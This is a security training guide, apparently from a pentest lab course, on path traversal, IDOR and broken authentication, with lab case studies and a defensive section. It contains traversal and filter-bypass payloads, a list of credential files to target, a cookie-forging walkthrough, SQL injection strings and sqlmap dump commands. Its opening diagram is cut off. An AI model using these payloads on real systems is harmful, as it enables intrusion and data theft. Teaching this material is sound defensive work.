## The Big Picture: Identity, Authorization, & Resource Fetching

Every modern web application performs three fundamental tasks when serving user requests:
1. **Authentication (AuthN):** *Who are you?* (Verifying the user's claimed identity).
2. **Authorization (AuthZ) / Access Control:** *What are you allowed to do or see?* (Evaluating permissions against requested actions or data).
3. **Resource Fetching / Execution:** *How does the system retrieve the requested resource?* (Interacting with the local file system, relational database, or internal services).

When applications fail at any of these stages, critical vulnerabilities emerge. The diagram below illustrates where **Broken Authentication**, **Broken Access Control (BAC)**, and **Path Traversal** strike within the standard web application lifecycle:

```text
+-------------------------------------------------------------------------------------------------------------+
|                                        WEB APPLICATION EXECUTION PIPELINE                                   |
+-------------------------------------------------------------------------------------------------------------+
                                                       |
                                            [ 1. HTTP Request Arrives ]
                                                       |
                                                       v
                 +---------------------------------------------------------------------------+
                 |                         STEP 1: AUTHENTICATION (AuthN)                    |
                 |                       "Are you who you claim to be?"                      |
                 +---------------------------------------------------------------------------+
                                  |                                          |
                      [ Valid Session / Token ]                 [ Predictable Token / Forged Cookie ]
                                  |                                          |
                                  v                                          v
                 +---------------------------------+        +---------------------------------+
                 |       Identity Established      |        |   💥 BROKEN AUTHENTICATION       |
                 |      (User: Bob, Role: User)    |        |   - Session Fixation / Hijacking|
                 +---------------------------------+        |   - Unkeyed Client-Side Tokens  |
                                  |                         |   - Predictable Session IDs     |
                                  v                         +---------------------------------+
                 +---------------------------------------------------------------------------+
                 |                         STEP 2: ACCESS CONTROL (AuthZ)                    |
                 |                      "Do you have rights to this record?"                 |
                 +---------------------------------------------------------------------------+
                                  |                                          |

                 +---------------------------------+        +---------------------------------+
```

## 1. Core Primitives: Encoding vs. Encryption vs. Hashing

A foundational skill in penetration testing and security operations is recognizing how data is represented on the wire. Security novices often confuse **Encoding**, **Encryption**, and **Hashing**, leading to flawed exploit hypotheses (e.g., trying to "decode" an irreversible hash).

```text
+-------------------+------------------------------------+---------------------------------------+
| Primitive         | Mathematical Core                  | Primary Security Objective            |
+-------------------+------------------------------------+---------------------------------------+
| Encoding          | Format translation (No Secret)     | Data usability & transport across HTTP|
| Hashing           | One-way mathematical digest        | Integrity verification & storage      |
| Encryption        | Two-way cryptographic cipher (Key) | Confidentiality (Secrecy)             |
+-------------------+------------------------------------+---------------------------------------+
```

### Encoding: Safe Transport Across Heterogeneous Systems
*   **Purpose:** Web protocols (HTTP, URL, MIME) were originally built to handle plain ASCII text. Binary files (images, compiled code) or special characters (spaces, ampersands, slashes) break protocol delimiters. Encoding translates arbitrary binary data or special characters into standardized, printable character sets.
*   **Reversibility:** Completely **reversible without any secret key**. Anyone with access to the algorithm can decode it instantly.
*   **Base64 Mechanics:** Base64 takes binary data, slices it into 6-bit groups (each representing a value from `0` to `63`), and maps each value to an ASCII character (`A-Z`, `a-z`, `0-9`, `+`, `/`).
    ```text
    Input Text:   "admin"
    ASCII / Hex:   0x61        0x64        0x6D        0x69        0x6E
    Binary:        01100001    01100100    01101101    01101001    01101110
    6-Bit Slices:  011000   010110   010001   101101   011010   010110   1110[00] (padded)
    Values:        24       22       17       45       26       22       56     pad
    Base64 Output: Y        W        R        t        a        W        4      =
    ```
*   **URL Encoding (Percent-Encoding):** Replaces non-ASCII or reserved URI characters with a `%` followed by their two-digit hexadecimal ASCII value:
    *   ` ` (Space) $\rightarrow$ `%20` or `+`
    *   `'` (Single Quote) $\rightarrow$ `%27`
    *   `=` (Equals) $\rightarrow$ `%3D`
    *   `/` (Forward Slash) $\rightarrow$ `%2F`
    *   `../` (Parent Directory) $\rightarrow$ `%2e%2e%2f`

### Hashing: One-Way Mathematical Fingerprinting
*   **Purpose:** Takes an arbitrary length input and maps it through a fixed-size mathematical compression function to produce a unique digest (e.g., MD5 produces 128 bits / 32 hex chars; SHA-1 produces 160 bits / 40 hex chars; SHA-256 produces 256 bits / 64 hex chars).
*   **Reversibility:** Completely **one-way**. You cannot mathematically calculate the original input from the digest alone.
*   **The Avalanche Effect:** Changing even a single bit in the input radically alters the entire resulting hash.
*   **Cracking vs. Decoding:** When an attacker recovers plaintext from a hash, they are **not decoding** it; they are performing a dictionary, brute-force, or rainbow-table attack (computing hashes of known words and comparing them).

### Encryption: Secrecy Guaranteed by Keys
*   **Purpose:** Scrambles plaintext into ciphertext using complex mathematical transformations (substitution, permutation) governed by a secret key.
*   **Reversibility:** Fully **reversible**, but **strictly conditional upon possessing the correct decryption key**.
*   **Symmetric (AES):** Same key used for encryption and decryption.
*   **Asymmetric (RSA, ECC):** Public key encrypts; corresponding private key decrypts.

### Comparative Reference Matrix

| Feature | Encoding | Hashing | Encryption |
| :--- | :--- | :--- | :--- |
| **Primary Goal** | Format compatibility & transport | Data integrity & signature | Confidentiality & privacy |
| **Requires Secret Key?** | ❌ Never | ❌ Never (HMAC uses a secret key) | ✅ Always |
| **Mathematically Reversible?**| ✅ Yes, universally | ❌ No, strictly one-way | ✅ Yes, with the secret key |
| **Output Size** | Expands ~33% (Base64) | Fixed length regardless of input | Proportional to input + block padding |
| **Common Algorithms** | Base64, Hex, URL, ASCII, UTF-8 | SHA-256, SHA-1, MD5, bcrypt | AES-256, ChaCha20, RSA |
| **Typical Use Case** | Email attachments, JWT payloads | Password verification, file integrity | HTTPS traffic, encrypted disks |
| **Security Pitfall** | Assuming encoded data is "safe" | Using unsalted fast hashes (MD5) | Hardcoding secret keys in code |

### Pentesting Diagnostic: Triage Workflow

```text
[ Mystery String ]
       |
       +---> Does it contain '=', '+', '/' and alphanumeric characters?
       |     ---> Likely Base64. Try: echo -n "<str>" | base64 -d
       |
       +---> Does it contain '%20', '%2F', '%3D'?
       |     ---> URL-Encoded. Decode via Burp Decoder or CyberChef.
       |
       +---> Is it exactly 32 hex characters [0-9a-fA-F]?
       |     ---> Likely MD5 Hash. Check Hashcat / CrackStation. (Do NOT attempt Base64 decode!)
       |
       +---> Is it exactly 40 hex characters?
       |     ---> Likely SHA-1 Hash.
       |
       +---> Is it exactly 64 hex characters?
             ---> Likely SHA-256 Hash.
```

## 2. Path Traversal (Directory Traversal)

**Path Traversal** (also known as Directory Traversal) is an input validation vulnerability that occurs when an application uses user-supplied input to construct a file path without sufficient sanitization. This allows an attacker to escape the designated web document root and access arbitrary files on the underlying operating system.

### The Mechanics of Hierarchical Navigation
Operating systems use relative path pointers:
*   `.` represents the **current working directory**.
*   `..` represents the **parent directory** (one step up the tree).

When a developer writes backend code that directly concatenates user input:
```php
// VULNERABLE CODE (PHP)
$file = $_GET['file'];
include("/var/www/html/public/images/" . $file);
```
If the user passes `cat.png`, the system reads `/var/www/html/public/images/cat.png`.  
If the attacker passes `../../../../etc/passwd`, the operating system resolves the traversal step-by-step:

```text
+-------------------------------------------------------------------------------------------------+
|                                 OPERATING SYSTEM PATH RESOLUTION                                |
+-------------------------------------------------------------------------------------------------+

  Step 0: /var/www/html/public/images/
  Step 1: /var/www/html/public/images/..   ---> Resolves to: /var/www/html/public/
  Step 2: /var/www/html/public/..          ---> Resolves to: /var/www/html/
  Step 3: /var/www/html/..                 ---> Resolves to: /var/www/
  Step 4: /var/www/..                      ---> Resolves to: /var/
  Step 5: /var/..                          ---> Resolves to: / (Root Filesystem)
  Step 6: /..                              ---> Remains: / (Root cannot go higher)
  Step 7: /etc/passwd                      ---> Reads: /etc/passwd!
```

```text
+--------------+               HTTP GET /view?file=../../../../etc/passwd              +-------------------+
|              | --------------------------------------------------------------------> |                   |
|   Attacker   |                                                                       |    Web Server     |
| (Burp Suite) | <-------------------------------------------------------------------- | (/var/www/html/)  |
+--------------+            HTTP 200 OK (Body contains root:x:0:0:root:/root...)       +-------------------+
                                                                                                 |
                                                                                                 v
                                                                                       [ Filesystem Kernel ]
                                                                                       Resolves path escape
                                                                                       Fetches /etc/passwd
```

### High-Value Target Files

| OS Platform | Target File | Security Significance |
| :--- | :--- | :--- |
| **Linux / UNIX** | `/etc/passwd` | Lists system user accounts, home directories, default shells. |
| **Linux / UNIX** | `/etc/shadow` | Contains password hashes (requires elevated server privileges). |
| **Linux / UNIX** | `/proc/self/environ` | Process environment variables; often leaks API tokens, DB passwords. |
| **Linux / UNIX** | `/var/log/apache2/access.log` | Web access logs (can be poisoned for Log Poisoning to RCE). |
| **Linux / UNIX** | `~/.ssh/id_rsa` or `id_ed25519` | Private SSH keys for local users. |
| **Windows** | `C:\Windows\win.ini` | Standard diagnostic file to confirm traversal. |
| **Windows** | `C:\Windows\System32\drivers\etc\hosts` | Local DNS host mappings. |
| **Web Apps** | `../../wp-config.php` or `.env` | Application database credentials and cryptographic app keys. |

### Filter Evasion & Bypasses
Developers often implement flawed blacklists instead of robust architectural controls. Attackers use specific evasion techniques:

1.  **Nested Traversal Sequences (`....//` or `..././`):**
    *   *Flawed defense:* `filename.replace("../", "")` (Single-pass replacement).
    *   *Payload:* `....//....//....//etc/passwd`
    *   *Result:* When the inner `../` is stripped out, the remaining characters collapse back into `../`!
2.  **URL Encoding:**
    *   Web servers or proxies decode `%2e%2e%2f` into `../`.
    *   *Payload:* `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`
3.  **Double URL Encoding:**
    *   If the web server decodes once and passes the string to a backend framework that decodes a second time:
    *   `.` $\rightarrow$ `%252e`, `/` $\rightarrow$ `%252f`
    *   *Payload:* `%252e%252e%252f`
4.  **Absolute Path Injection:**
    *   If the backend code uses APIs like Python's `os.path.join('/var/www/images', user_input)`:
    *   In Python, if `user_input` starts with an absolute path (`/etc/passwd`), `os.path.join` discards the prefix entirely!
5.  **Null-Byte Injection (`%00`):**
    *   *Context:* Prevalent in legacy PHP (< 5.3.4) and C-based wrappers.
    *   If the code appends an extension: `include($file . ".png");`
    *   *Payload:* `../../../../etc/passwd%00`
    *   *Result:* The null terminator truncates the string in memory, ignoring `.png`.

## 3. Broken Access Control (BAC): OWASP #1

**Broken Access Control** occurs when an application fails to properly enforce restrictions on what authenticated or anonymous users are permitted to do. While authentication verifies identity, access control enforces policy. When authorization logic is omitted, flawed, or delegated to the client, users can access unauthorized data or execute privileged administrative actions.

### Horizontal vs. Vertical Access Failures

```text
===================================================================================================
                                      ACCESS CONTROL TOPOLOGY
===================================================================================================

       [ ROLE: ADMINISTRATOR ]  <------------------+
                 ^                                 |
                 | (Vertical Escalation)           |
                 |                                 |
       [ ROLE: STANDARD USER ]                     |
         /                 \                       |
        v                   v                      |
  [ User A (Bob) ] <----> [ User B (Alice) ]       |
          (Horizontal Escalation / IDOR)           |
                                                   |
  [ Unauthenticated Attacker ] --------------------+ (Unprotected Administrative Endpoint)
```

```text
+------------------------------------+------------------------------------------------------------+
| Escalation Vector                  | Mechanism & Scenario                                       |
+------------------------------------+------------------------------------------------------------+
| **Horizontal Escalation (IDOR)**   | A standard user accesses records belonging to another      |
|                                    | standard user at the exact same privilege tier.            |
|                                    | *Example:* Bob changes `?id=101` to `?id=102` and reads    |
|                                    | Alice's medical history or private banking statements.     |
+------------------------------------+------------------------------------------------------------+
| **Vertical Escalation**            | A lower-privileged user elevates their privileges to a     |
|                                    | higher role (e.g., standard employee becoming SuperAdmin). |
|                                    | *Example:* Appending `&role=admin` or altering hidden form  |
|                                    | values, or accessing `/admin/console` directly.            |
+------------------------------------+------------------------------------------------------------+
```

### The Insecure Direct Object Reference (IDOR) Breakdown
An IDOR is a specific, prevalent sub-type of Broken Access Control. It occurs when:
1.  An application exposes a direct reference to an internal database key, filename, or record identifier in a request parameter.
2.  The server fails to validate whether the currently logged-in user actually owns that object.

```text
[ USER A (Attacker: Bob, ID: 405) ]
                |
                | 1. Logs in legitimately -> Issued valid session cookie
                | 2. Navigates to: GET /api/v1/profile?account_id=405
                | 3. Intercepts request in Burp Suite
                | 4. Changes parameter to: GET /api/v1/profile?account_id=406 (Alice's ID)
                v
       +------------------+
       |   Target Server  |
       +------------------+
                |
                +---> [ FLAGGED FLAW ] Does the code check:
                |     `WHERE account_id = 406 AND owner_user_id = session.user_id`?
                |
                +---> ❌ NO! It only runs: `SELECT * FROM accounts WHERE account_id = 406`
                |
                v
[ HTTP 200 OK: Returns Alice's Full Financial Profile to Bob! ]
```

### The "Client-Side Security is an Illusion" Principle
A frequent developer blunder is hiding sensitive UI elements instead of securing the backend API:
*   *Developer logic:* "We didn't show the 'Delete User' button to non-admins in the HTML, so non-admins can't delete users."
*   *Pentester reality:* The attacker inspects the client JavaScript, locates the API route `POST /api/users/delete?id=12`, crafts the request manually using `curl` or Burp Suite Repeater, and executes it successfully because the server never checked the caller's session role!

## 4. Broken Authentication & Session Management

While Access Control dictates *permissions*, **Authentication** manages *identity*. HTTP is inherently stateless; every request is independent. Web applications maintain state across requests using **Sessions** and **Session Identifiers** (typically stored in cookies or HTTP authorization headers).

```text
+-------------------------------------------------------------------------------------------------+
|                                 STATELESS HTTP vs. SESSION IDENTIFIERS                          |
+-------------------------------------------------------------------------------------------------+

 [ Client Browser ]                                                          [ Web Application ]
         |                                                                            |
         | --- 1. POST /login (username: "bob", password: "Secret123") -------------> |
         |                                                                            | (Validates Hash)
         | <--- 2. HTTP 200 OK [ Set-Cookie: sessionID=a8f9c2d1... ; HttpOnly ] ----  | (Creates DB entry)
         |                                                                            |
         | --- 3. GET /dashboard [ Cookie: sessionID=a8f9c2d1... ] -----------------> |
         |                                                                            | (Looks up session)
         | <--- 4. HTTP 200 OK [ Welcome, Bob! ] ------------------------------------ |
```

### Key Vulnerability Classes in Authentication

```text
+------------------------------+-------------------------------------------------------------------+
| Vulnerability                | Root Cause Mechanics                                              |
+------------------------------+-------------------------------------------------------------------+
| **Predictable Session IDs**  | Session IDs generated sequentially (`101`, `102`) or via weak     |
|                              | pseudo-random number generators (PRNG) instead of CSPRNG.         |
+------------------------------+-------------------------------------------------------------------+
| **Session Fixation**         | The application preserves an existing session ID across login     |
|                              | instead of issuing a fresh, randomized ID upon authentication.     |
+------------------------------+-------------------------------------------------------------------+
| **Missing Logout**           | The client discards the cookie locally, but the backend server    |
| **Invalidation**             | never destroys the session record in its active session cache.    |
+------------------------------+-------------------------------------------------------------------+
| **Unsigned Client-Side**     | Session data is stored entirely on the client (e.g., cookie or    |
| **State Tampering**          | token) without a cryptographically secure server-side HMAC.       |
+------------------------------+-------------------------------------------------------------------+
```

## 5. Lab Methodology & CTF Case Studies (PentestGarage)

The following real-world lab scenarios from PentestGarage (RedTeam Hacker Academy) demonstrate the exploitation and analysis of these vulnerabilities in an authorized lab environment.

### Case Study 1: Broken Authentication via Client-Side Cookie Tampering

#### Architectural Analysis & Flaw
The target web application stores the session state entirely on the client within an HTTP cookie named `sessionID`. The application avoids storing session states in a server database. To "prevent" tampering, the application implemented a homemade integrity mechanism.

```text
+-------------------------------------------------------------------------------------------------+
|                                 ANATOMY OF THE FLAWED SESSION COOKIE                            |
+-------------------------------------------------------------------------------------------------+

 Raw Cookie Value:
 eyJhZG1pbiI6MCwidXNlciI6InRlc3QifS41ZTNkYWYzMTYxOGY3OTgzMmI4OWQ0NWY1MWQwZjExMTM0NTRmNzkz

 Split by the period (.):
 Part A (Data):      eyJhZG1pbiI6MCwidXNlciI6InRlc3QifS
 Part B (Signature): 5e3daf31618f79832b89d45f51d0f1113454f793
```

#### Diagnostic Investigation: Fact vs. Hypothesis
*   **Fact (Observation):** Part A ends without padding and contains base64-alphabet characters. Decoding Part A yields:
    ```bash
    echo -n "eyJhZG1pbiI6MCwidXNlciI6InRlc3QifS" | base64 -d
    # Output: {"admin":0,"user":"test"}
    ```
*   **Fact (Observation):** Part B is exactly 40 hexadecimal characters (`5e3daf...`). A 40-character hex string corresponds to a **160-bit SHA-1 digest**.
*   **Hypothesis:** The server verifies data integrity by calculating the SHA-1 hash of the JSON payload. If the server does not use a secret key (i.e., it is a plain SHA-1 hash and not an HMAC-SHA1), an attacker can forge any privilege level!
*   **Test:** Compute the SHA-1 of the decoded JSON string:
    ```bash
    echo -n '{"admin":0,"user":"test"}' | sha1sum
    # Output: 5e3daf31618f79832b89d45f51d0f1113454f793  -
    ```
*   **Result:** The computed hash matches Part B character-for-character!
*   **Conclusion:** The application relies on an **unkeyed hash**. Anyone who can modify the JSON can compute the corresponding SHA-1 hash, re-encode it, and assume total control.

#### The Exploit Walkthrough

```text
[ Step 1: Craft Desired State ]
  New Payload: {"admin":1,"user":"test"}

[ Step 2: Base64 Encode New Payload ]
  $ echo -n '{"admin":1,"user":"test"}' | base64
  Output: eyJhZG1pbiI6MSwidXNlciI6InRlc3QifQ==

[ Step 3: Compute New SHA-1 Digest ]
  $ echo -n '{"admin":1,"user":"test"}' | sha1sum
  Output: 2d14878eb3d44bc0988e0b9687e85c1aa7e35b71

[ Step 4: Assemble Forged Cookie ]
  eyJhZG1pbiI6MSwidXNlciI6InRlc3QifQ==.2d14878eb3d44bc0988e0b9687e85c1aa7e35b71

[ Step 5: Send Request in Burp Suite Repeater ]
  GET /admin_dashboard HTTP/1.1
  Host: vuln.pentestgarage.local
  Cookie: sessionID=eyJhZG1pbiI6MSwidXNlciI6InRlc3QifQ==.2d14878eb3d44bc0988e0b9687e85c1aa7e35b71

[ Result: HTTP 200 OK - Administrator Dashboard Unlocked! ]
```

### Case Study 2: Broken Access Control (Horizontal IDOR Parameter Manipulation)

#### Scientific Methodology Breakdown
*   **Observation:** When a logged-in student checks their submitted lab score, the browser issues:
    ```http
    GET /view_grade.php?submission_id=8842 HTTP/1.1
    Host: lab.pentestgarage.local
    Cookie: PHPSESSID=k91jf82mfls02kmfa
    ```
*   **Attack Surface:** The `submission_id` parameter directly exposes the relational database primary key.
*   **Hypothesis:** The application verifies that the requester has an active session, but does not verify that `submission_id=8842` belongs to the student linked to `PHPSESSID`.
*   **Test:** Send the request to **Burp Suite Repeater**. Decrement the identifier to `submission_id=8841`.
*   **Result:** The server responds with `HTTP 200 OK`, returning the full grade, name, student ID, and instructor notes for another user.
*   **Impact:** An attacker can write a 5-line Bash/Python loop to enumerate all submission IDs from `1` to `10000`, dumping the entire gradebook database without administrative privileges.

### Case Study 3: SQL Injection (SQLi) with Automated & Manual Enumeration

#### Context & Objectives
A web application's user search functionality (`userid` parameter) interacts directly with a backend MySQL database named `vulnapp`.

#### Manual Union-Based Injection
1.  **Determine column count:**
    ```text
    userid=1' ORDER BY 1-- -   (Success)
    userid=1' ORDER BY 2-- -   (Success)
    userid=1' ORDER BY 3-- -   (Success)
    userid=1' ORDER BY 4-- -   (Error: Unknown column 4 -> exactly 3 columns exist)
    ```
2.  **Locate injectable output positions:**
    ```text
    userid=-1' UNION SELECT 1, 2, 3-- -
    ```
3.  **Enumerate tables from schema metadata:**
    ```text
    userid=-1' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema='vulnapp'-- -
    # Discovers table: 'flag_tbl'
    ```

#### Automated Extraction with SQLmap
When requests are complex or parameters reside in POST bodies, manual enumeration can be automated using `sqlmap`:

```bash
# Step 1: Enumerate databases
sqlmap -u "http://lab.pentestgarage.local/search.php" --data="userid=1" -p userid --dbs

# Step 2: Enumerate tables in target database
sqlmap -u "http://lab.pentestgarage.local/search.php" --data="userid=1" -p userid -D vulnapp --tables

# Step 3: Dump the flag table
sqlmap -u "http://lab.pentestgarage.local/search.php" --data="userid=1" -p userid -D vulnapp -T flag_tbl --dump
```

## 6. Blue Team & SOC Perspective: Telemetry, Detection, & Defense

Security analysts must understand how these attacks manifest in server logs, network traffic, and SIEM dashboards to rapidly contain intrusions.

```text
+-------------------------------------------------------------------------------------------------+
|                                    DEFENSIVE DETECTION ARCHITECTURE                             |
+-------------------------------------------------------------------------------------------------+

   [ Attacker Activity ]
             |
             +---> Path Traversal Payload: `?file=../../../../etc/passwd`
             |        |
             |        v
             |     [ WAF (Web Application Firewall) ]
             |     - Regex Detection: `(\.\.\/|\.\.\\|%2e%2e%2f)`
             |     - Action: Block (HTTP 403 Forbidden) + Alert SOC
             |
             +---> BAC / IDOR Enumeration: Requests 500 distinct `?user_id=` in 60 seconds
             |        |
             |        v
             |     [ Web Access Logs -> SIEM Correlation Engine ]
             |     - Rule Trigger: "User requesting abnormal threshold of unique object IDs"
             |     - Action: High-Severity SOC Alert
             |
             +---> Session Replay Attack: Reusing cookie after logout
                      |
                      v
                   [ Application Server Audit Logs ]
                   - Log: "Session ID reused after invalidation timestamp"
                   - Action: Terminate connection, lock account, flag for IR triage
```

### Log Signatures & Detection Patterns

| Attack Vector | Log Source | Signature / Indicator | Immediate Containment Action |
| :--- | :--- | :--- | :--- |
| **Path Traversal** | Nginx/Apache Access Logs | Multiple requests containing `..%2f`, `..%5c`, or `/etc/passwd`. | Block IP at perimeter firewall; inspect web root permissions. |
| **IDOR / BAC** | Web Application Access Logs | Single IP / Session cycling through sequential IDs (`id=101`, `102`, `103`). | Revoke session; rate-limit endpoint; patch authorization check. |
| **Broken Auth** | Identity Provider / Auth Logs | Identical session tokens originating from multiple distinct GeoIPs or User-Agents. | Kill active sessions globally for the user; force credential reset. |

### Remediation Blueprint for Developers

```text
+-------------------------+-------------------------------------------------------------------------------+
| Vulnerability Class     | Robust Engineering Fix                                                        |
+-------------------------+-------------------------------------------------------------------------------+
| **Path Traversal**      | 1. Use indirect mapping: Accept an integer ID (`?file=1`), map it in a secure |
|                         |    backend array/database to a static file path.                             |
|                         | 2. Canonical path validation: Resolve path with `realpath()` and verify it    |
|                         |    strictly starts with the authorized base directory prefix.                  |
|                         | 3. Run application processes in a restricted `chroot` or container jail.     |
+-------------------------+-------------------------------------------------------------------------------+
| **Broken Access Control**| 1. Enforce authorization server-side on **every single endpoint**:           |
|                         |    `SELECT * FROM docs WHERE doc_id = ? AND tenant_id = ?`                    |
|                         | 2. Implement Role-Based (RBAC) or Attribute-Based Access Control (ABAC).      |
|                         | 3. Never trust client-supplied privilege flags (`role`, `is_admin`).          |
+-------------------------+-------------------------------------------------------------------------------+
| **Broken Authentication**| 1. Use cryptographically secure session generators (e.g., CSPRNG).           |
|                         | 2. If using client-side tokens (like JWT), sign them with a strong secret key  |
|                         |    using HMAC-SHA256 or asymmetric RSA signatures.                            |
|                         | 3. Enforce cookie flags: `HttpOnly` (blocks XSS theft), `Secure` (HTTPS only),|
|                         |    and `SameSite=Strict` (prevents CSRF).                                     |
```

## 7. Technical Interview Deep Dive

### Q1: Why does calculating a SHA-1 hash of a client cookie fail to protect it against tampering?
**Mentor Answer:** A hash function without a secret key (like plain SHA-1 or MD5) is an integrity check, not an authenticity check. Anyone who knows the algorithm and has the data can compute the exact same mathematical digest. To ensure authenticity, the application must use a **Hash-based Message Authentication Code (HMAC)**, which incorporates a secret key known *only* to the backend server ($HMAC = Hash(Key \oplus opad \parallel Hash(Key \oplus ipad \parallel Message))$). Without the server's private secret, an attacker cannot forge the signature.

### Q2: What is the fundamental difference between an Authentication flaw and an Access Control flaw?
**Mentor Answer:** Authentication is about **identity** ("Who are you?"), whereas Access Control is about **authorization** ("What are you allowed to do?"). If an attacker can guess a weak password, crack a session token, or bypass a login screen, it is **Broken Authentication**. If an attacker logs in as a legitimate regular user and accesses an administrative dashboard or modifies another user's profile, authentication worked perfectly, but **Access Control** was broken.

### Q3: Why is validating user input against a list of dangerous strings (a blacklist like `../`) considered an anti-pattern for stopping Path Traversal?
**Mentor Answer:** Blacklists are inherently brittle because attackers can bypass them using unexpected encodings, nested sequences (e.g., `....//`), alternative directory separators (`..\` on Windows), or filesystem quirks (null bytes). Secure software design mandates **allowlisting** (restricting inputs strictly to expected alphanumeric names) or **indirect object references** (mapping user input to file keys).
